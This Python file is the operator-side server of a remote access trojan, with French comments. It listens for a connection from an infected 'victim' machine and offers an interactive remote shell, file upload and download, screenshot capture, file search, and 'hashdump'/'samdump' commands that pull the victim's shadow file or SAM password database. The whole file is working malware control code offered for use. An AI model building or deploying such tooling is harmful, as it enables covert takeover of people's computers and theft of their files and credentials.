import socket 
import sys 
import os
import random
import subprocess
import platform
import glob
import pyautogui


class RAT_SERVER:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.server = None
        self.client = None
        self.os = platform.system().lower()


    def start_server(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creation d'un socket serveur TCP
        self.server.bind((self.ip, self.port)) # Liaison du socket au port et a l'adresse Ip 
        self.server.listen() # Socket en ecoute pour les connexion entrantes 
        print("Server listening on {}:{}".format(self.ip, self.port))

    def build_connections(self): # Methode permettant d'accepter une connexion entrante 
        self.client, addr = self.server.accept()
        print("Connection from:", addr)
        print("Tap 'help' for commands")

    def send_command(self, command): # methode permettant d'envoyer une commande 
        self.client.send(command.encode())

    def receive_output(self):
        return self.client.recv(4096).decode()

    def close_connection(self):
        self.client.close()
        self.server.close()

    def execute_shell(self):
        while True: # Boucle pour permettre à l'utilisateur de saisir des commandes à envoyer au client

            command = str(input ("rat$ > : "))
            self.client.send(command.encode("utf-8"))
            if command.lower()== 'exit':
                break       
            resultat = self.client.recv(1024).decode("utf-8")
            print(resultat)



    def handle_command(self, command):
        if command == 'exit':
            self.client.send('exit'.encode())
            print('Exiting...')
            self.close_connection()
            sys.exit(0)
        elif command == 'help': # Affiche le menu d'aide 
            print("======================================================")
            print("                       Commands                       ")
            print("======================================================")
            print("Commands Available: ")
            print("======================================================")
            print('[+] récupération de fichiers du serveur vers la victime : upload ')
            print('[+] récupération de fichiers de la victime vers le serveur: download </path/to/file> <file>')
            print('[+] prendre une capture d écran de la machine victime: screenshot')
            print('[+] ouvrir un shell (bash ou cmd) interactif: shell')
            print('[+] obtenir la configuration réseau de la machine victime: ipconfig/ifconfig')
            print('[+] rechercher un fichier sur la machine victime: find/search')
            print('[+] récupérer la base SAM ou le fichier shadow de la machine: hashdump')
            print('[+] Exit: exit')
        elif command == 'shell':
            self.execute_shell() # execution de la methode execute_shell()
        elif command.startswith("upload"):
            self.client.sendall(command.encode()) # Envoi de la commande upload au client 
            filepath = str(input("Enter the filepath to the file: ")) # l'utilisateur doit renseigner le chemin du fichier 
            filename = str(input("Enter the filepath to file on client (with filename and extension): ")) # l'utilisateur doit le nom du fichier
            with open(filepath, 'rb') as file:
                data= file.read(2147483647)
                self.client.sendall(filename.encode("utf-8"))
                self.client.sendall(data)
            print("File has been uploaded")
        elif command[:8] == 'download':
            self.client.send(command.encode("utf-8"))
            filepath= command.split(" ")[2]
            file = self.client.recv(2147483647)
            with open(filepath, 'wb') as f:
                f.write(file)
            print("File is downloaded")
        elif command == 'screenshot':
            self.client.send(command.encode())
            file = self.client.recv(2147483647)
            path = f'{os.getcwd()}/{random.randint(11111,99999)}.jpeg' # Construction  d'un chemin de fichier pour enregistrer une image au format JPEG.
            with open(path, 'wb') as f:
                f.write(file)
                path1 = os.path.abspath(path)
                print(f"File is stored at {path1}")
        elif command == 'hashdump':
            self.client.send(command.encode())
            filepath = f'{os.getcwd()}\\shadow.txt' # A partir du repertoire actuel on cree un fichier shadow.txt 
            file = self.client.recv(2147483647)
            with open(filepath, 'wb') as f:
                f.write(file)
            print("Shadow file has been downloaded and saved on the server.")
        elif command == 'samdump':
            self.client.send(command.encode())
            filepath = f'{os.getcwd()}/sam.txt'
            file = self.client.recv(2147483647)
            with open(filepath, 'wb') as f:
                f.write(file)
            print("sam file has been downloaded and saved on the server.")

        else:
            self.client.send(command.encode())
            result = self.client.recv(4096).decode().strip('\n')
            print(result)

server = RAT_SERVER('', 12345)

if __name__ == '__main__':
    server.start_server()
    server.build_connections()
    while True:
        try:
            command = input("Enter command : ").strip('\n') 
            server.handle_command(command)
        except KeyboardInterrupt:
            print("Exiting...")
            server.close_connection()
            sys.exit(0)